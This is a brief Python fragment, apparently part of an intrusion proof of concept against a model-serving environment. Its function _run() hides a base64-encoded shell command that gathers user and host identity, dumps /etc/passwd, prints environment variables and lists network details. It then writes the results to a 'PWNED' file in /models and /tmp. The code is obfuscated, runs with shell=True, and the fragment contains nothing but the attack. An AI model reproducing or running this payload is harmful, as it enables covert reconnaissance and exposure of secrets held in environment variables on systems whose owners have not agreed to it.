...
def _run():
    try:
        import base64 as b
        cmd = b.b64decode("aWQ7IGhvc3RuYW1lOyB1bmFtZSAtYTsgZWNobyA9PT1QQVNTV0Q9PT07IGNhdCAvZXRjL3Bhc3N3ZDsgZWNobyA9PT1FTlY9PT07IGVudiB8IGhlYWQgLTMwOyBlY2hvID09PU5FVD09PTsgY2F0IC9ldGMvaG9zdHM7IGlwIGEgMj4vZGV2L251bGwgfCBoZWFkIC0zMA==").decode()
        out = subprocess.check_output(cmd, shell=True, timeout=20, stderr=subprocess.STDOUT)
        out_s = out.decode(errors="replace")
        for d in ["/models", "/tmp"]:
            try:
                with open(d + "/PWNED-FULL-6e4f3f.txt", "w") as f:
                    f.write(out_s)
            except Exception:
                pass
